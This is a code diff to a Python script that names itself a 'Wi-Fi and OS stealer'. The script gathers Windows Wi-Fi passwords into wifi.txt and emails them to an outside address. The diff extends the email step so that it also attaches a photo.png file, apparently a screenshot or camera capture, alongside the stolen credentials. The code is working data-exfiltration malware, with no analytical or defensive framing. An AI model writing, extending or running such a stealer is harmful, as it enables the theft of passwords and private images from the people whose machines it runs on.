@@ -24,6 +24,7 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
 
 
 def get_windows_wifi_passwords():
@@ -191,26 +192,31 @@ def send_email(email_text: str):
     subject = 'Wi-Fi and OS stealer'
 
     message = MIMEMultipart()
-    message["From"] = email
-    message["To"] = dest_email
-    message["Subject"] = subject
+    message['From'] = email
+    message['To'] = dest_email
+    message['Subject'] = subject
 
-    message.attach(MIMEText(email_text, "plain"))
+    message.attach(MIMEText(email_text, 'plain'))
 
-    filename = "wifi.txt"
+    filename = 'wifi.txt'
 
-    with open(filename, "rb") as attachment:
-        part = MIMEBase("application", "octet-stream")
+    with open(filename, 'rb') as attachment:
+        part = MIMEBase('application', 'octet-stream')
         part.set_payload(attachment.read())
 
     encoders.encode_base64(part)
 
     part.add_header(
-        "Content-Disposition",
-        f"attachment; filename= {filename}",
+        'Content-Disposition',
+        f'attachment; filename= {filename}',
     )
 
+    part_photo = MIMEApplication(open('photo.png', 'rb').read())
+    part_photo.add_header('Content-Disposition', 'attachment',
+                          filename='photo.png')
+
     message.attach(part)
+    message.attach(part_photo)
     text = message.as_string()
 
     context = ssl.create_default_context()
